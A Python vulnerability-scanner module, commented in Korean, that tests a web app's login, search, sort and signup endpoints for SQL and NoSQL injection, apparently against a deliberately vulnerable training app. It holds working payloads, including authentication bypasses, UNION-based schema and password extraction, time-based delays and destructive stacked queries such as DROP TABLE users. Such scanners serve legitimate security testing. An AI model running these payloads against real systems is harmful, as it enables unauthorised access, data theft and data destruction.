"""
SQL Injection (SQL 인젝션)
Error-based, Union-based, Boolean-based Blind, Time-based Blind SQLi
"""
import requests
import time
import re

def scan(target_url):
    result = {
        'name': 'SQL Injection (종합)',
        'category': 'Injection',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': 'Prepared Statement/ORM 사용, 입력값 검증, 최소 권한 원칙',
        'details': ''
    }
    
    details = []
    
    # SQL Injection 페이로드 분류
    payloads = {
        'error_based': [
            ("'", "Single Quote", "syntax error"),
            ("''", "Double Quote", "syntax error"),
            ("1' AND '1'='2", "AND False", "no results"),
        ],
        'auth_bypass': [
            ("' OR '1'='1", "Classic OR", "authentication bypass"),
            ("' OR '1'='1' --", "OR with Comment", "bypass"),
            ("' OR '1'='1' /*", "OR with C Comment", "bypass"),
            ("admin' --", "Admin Comment", "bypass"),
            ("admin'#", "Admin Hash", "bypass"),
            ("' OR 1=1 --", "Numeric OR", "bypass"),
            ("') OR ('1'='1", "Parenthesis OR", "bypass"),
            ("' OR 'x'='x", "Alternative OR", "bypass"),
        ],
        'union_based': [
            ("' UNION SELECT NULL--", "Union 1 Col", "union injection"),
            ("' UNION SELECT NULL,NULL--", "Union 2 Cols", "union injection"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union 3 Cols", "union injection"),
            ("' UNION SELECT NULL,NULL,NULL,NULL--", "Union 4 Cols", "union injection"),
            ("' UNION SELECT @@version--", "Union Version", "version disclosure"),
            ("' UNION SELECT user()--", "Union User", "user disclosure"),
            ("' UNION SELECT database()--", "Union DB", "database name"),
            ("' UNION SELECT table_name FROM information_schema.tables--", "Union Tables", "schema disclosure"),
        ],
        'boolean_blind': [
            ("' AND '1'='1", "AND True", "true condition"),
            ("' AND '1'='2", "AND False", "false condition"),
            ("' AND SUBSTRING(@@version,1,1)='5", "Version Check", "blind extraction"),
        ],
        'time_based': [
            ("' OR SLEEP(5)--", "MySQL Sleep", "5 second delay"),
            ("'; WAITFOR DELAY '00:00:05'--", "MSSQL Wait", "5 second delay"),
            ("'||pg_sleep(5)--", "PostgreSQL Sleep", "5 second delay"),
            ("' AND SLEEP(5)--", "AND Sleep", "conditional delay"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Subquery Sleep", "delay"),
        ],
        'stacked_queries': [
            ("'; DROP TABLE users--", "Drop Table", "destructive"),
            ("'; INSERT INTO users VALUES('hacker','pass')--", "Insert", "data manipulation"),
            ("'; UPDATE users SET password='hacked'--", "Update", "data modification"),
        ],
        'second_order': [
            ("admin'--", "Second Order 1", "stored injection"),
            ("' UNION SELECT password FROM users WHERE username='admin'--", "Second Order 2", "password extraction"),
        ]
    }
    
    login_url = f"{target_url}/api/auth/login"
    
    # 1. Error-based SQL Injection
    details.append("[SQLi-1] Error-based SQL Injection")
    
    for payload, name, _ in payloads['error_based']:
        try:
            data = {'employeeId': payload, 'password': 'test'}
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            resp = requests.post(login_url, json=data, headers=headers, timeout=5)
            
            # SQL 에러 메시지 확인
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle',
                'ora-', 'sql server', 'syntax error', 'unclosed quotation',
                'quoted string not properly terminated', 'unterminated string',
                'invalid input syntax', 'pg_query', 'mysql_fetch'
            ]
            
            if any(error in resp.text.lower() for error in sql_errors):
                result['vulnerabilities'].append(f"Error-based SQLi: {name}")
                details.append(f"  ✗ {name} - SQL 에러 노출")
                result['status'] = 'VULNERABLE'
                
                # 데이터베이스 타입 식별
                if 'mysql' in resp.text.lower():
                    details.append(f"    DB: MySQL")
                elif 'postgresql' in resp.text.lower() or 'pg_' in resp.text.lower():
                    details.append(f"    DB: PostgreSQL")
                elif 'sqlite' in resp.text.lower():
                    details.append(f"    DB: SQLite")
                elif 'oracle' in resp.text.lower() or 'ora-' in resp.text.lower():
                    details.append(f"    DB: Oracle")
                elif 'sql server' in resp.text.lower():
                    details.append(f"    DB: MS SQL Server")
                
        except Exception as e:
            pass
    
    # 2. Authentication Bypass
    details.append("\n[SQLi-2] Authentication Bypass")
    
    for payload, name, _ in payloads['auth_bypass']:
        try:
            data = {'employeeId': payload, 'password': 'randompassword'}
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            resp = requests.post(login_url, json=data, headers=headers, timeout=5)
            
            # 성공적인 로그인 확인
            if resp.status_code == 200 and ('token' in resp.text.lower() or 'success' in resp.text.lower()):
                result['vulnerabilities'].append(f"Auth Bypass: {name}")
                details.append(f"  ✗ {name} - 인증 우회 성공")
                result['status'] = 'VULNERABLE'
                
        except:
            pass
    
    # 3. Union-based SQL Injection
    details.append("\n[SQLi-3] Union-based SQL Injection")
    
    # 검색 기능에서 테스트
    search_url = f"{target_url}/api/boards"
    
    for payload, name, _ in payloads['union_based']:
        try:
            params = {'search': payload}
            headers = {'X-Security-Mode': 'vulnerable'}
            
            resp = requests.get(search_url, params=params, headers=headers, timeout=5)
            
            # Union 성공 지표
            union_indicators = [
                r'\d+\.\d+\.\d+',  # MySQL version pattern
                'mysql', 'mariadb', 'postgres',  # DB names
                'information_schema', 'mysql.user',  # System tables
            ]
            
            for indicator in union_indicators:
                if re.search(indicator, resp.text, re.IGNORECASE):
                    result['vulnerabilities'].append(f"Union-based SQLi: {name}")
                    details.append(f"  ✗ {name} - 데이터 추출 가능")
                    result['status'] = 'VULNERABLE'
                    break
                    
        except:
            pass
    
    # 4. Boolean-based Blind SQL Injection
    details.append("\n[SQLi-4] Boolean-based Blind SQLi")
    
    try:
        # True 조건
        true_payload = "' AND '1'='1"
        data_true = {'employeeId': true_payload, 'password': 'test'}
        headers = {'X-Security-Mode': 'vulnerable', 'Content-Type': 'application/json'}
        resp_true = requests.post(login_url, json=data_true, headers=headers, timeout=5)
        
        # False 조건
        false_payload = "' AND '1'='2"
        data_false = {'employeeId': false_payload, 'password': 'test'}
        resp_false = requests.post(login_url, json=data_false, headers=headers, timeout=5)
        
        # 응답 차이 확인
        if resp_true.text != resp_false.text or resp_true.status_code != resp_false.status_code:
            result['vulnerabilities'].append("Boolean-based Blind SQLi")
            details.append("  ✗ True/False 조건에 따른 응답 차이 존재")
            result['status'] = 'VULNERABLE'
        else:
            details.append("  ✓ Boolean Blind SQLi 방어됨")
            
    except:
        details.append("  • Boolean Blind 테스트 실패")
    
    # 5. Time-based Blind SQL Injection
    details.append("\n[SQLi-5] Time-based Blind SQLi")
    
    for payload, name, expected_delay in payloads['time_based']:
        try:
            data = {'employeeId': payload, 'password': 'test'}
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            start_time = time.time()
            resp = requests.post(login_url, json=data, headers=headers, timeout=10)
            elapsed = time.time() - start_time
            
            # 4초 이상 지연되면 Time-based SQLi
            if elapsed > 4:
                result['vulnerabilities'].append(f"Time-based Blind SQLi: {name}")
                details.append(f"  ✗ {name} - {elapsed:.1f}초 지연 발생")
                result['status'] = 'VULNERABLE'
                
        except requests.Timeout:
            result['vulnerabilities'].append(f"Time-based SQLi: {name} (Timeout)")
            details.append(f"  ✗ {name} - Timeout 발생")
            result['status'] = 'VULNERABLE'
        except:
            pass
    
    # 6. ORDER BY / LIMIT SQLi (Prepared Statement 우회)
    details.append("\n[SQLi-6] ORDER BY 절 SQL Injection")
    
    try:
        orderby_payloads = [
            "id DESC; DROP TABLE test--",
            "1,SLEEP(5)",
            "(SELECT CASE WHEN (1=1) THEN id ELSE name END)",
            "id,(SELECT 1 FROM users LIMIT 1)",
        ]
        
        for payload in orderby_payloads:
            params = {'sort': payload, 'orderBy': payload}
            headers = {'X-Security-Mode': 'vulnerable'}
            
            start_time = time.time()
            resp = requests.get(f"{target_url}/api/boards", params=params, 
                              headers=headers, timeout=6)
            elapsed = time.time() - start_time
            
            # 에러 또는 지연 확인
            if resp.status_code == 500 or 'error' in resp.text.lower():
                result['vulnerabilities'].append("ORDER BY SQLi")
                details.append(f"  ✗ ORDER BY 절 취약")
                result['status'] = 'VULNERABLE'
                break
            elif elapsed > 4:
                result['vulnerabilities'].append("ORDER BY Time-based SQLi")
                details.append(f"  ✗ ORDER BY Time-based")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • ORDER BY 테스트 실패")
    
    # 7. Second-order SQL Injection
    details.append("\n[SQLi-7] Second-order SQLi")
    
    try:
        # 회원가입에 페이로드 저장
        signup_url = f"{target_url}/api/auth/signup"
        
        malicious_name = "admin' OR '1'='1"
        data = {
            'employeeId': f'sqli_test_{int(time.time())}',
            'password': 'test123',
            'name': malicious_name
        }
        
        headers = {'X-Security-Mode': 'vulnerable'}
        resp = requests.post(signup_url, json=data, headers=headers, timeout=5)
        
        if resp.status_code in [200, 201]:
            # 저장된 데이터가 나중에 쿼리될 때 실행되는지 확인
            details.append("  ⚠ Second-order SQLi 테스트 완료 (추가 검증 필요)")
        
    except:
        details.append("  • Second-order 테스트 불가")
    
    # 8. NoSQL Injection (MongoDB 등)
    details.append("\n[SQLi-8] NoSQL Injection")
    
    try:
        nosql_payloads = [
            {"employeeId": {"$ne": None}, "password": {"$ne": None}},
            {"employeeId": {"$gt": ""}, "password": {"$gt": ""}},
            {"employeeId": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        ]
        
        for payload in nosql_payloads:
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            resp = requests.post(login_url, json=payload, headers=headers, timeout=5)
            
            if resp.status_code == 200 and 'token' in resp.text.lower():
                result['vulnerabilities'].append("NoSQL Injection")
                details.append(f"  ✗ NoSQL 인젝션 성공")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • NoSQL 테스트 실패")
    
    if result['status'] == 'SAFE':
        details.append("\n✓ 전반적으로 SQL Injection 방어가 잘 되어 있습니다")
    
    result['details'] = '\n'.join(details)
    return result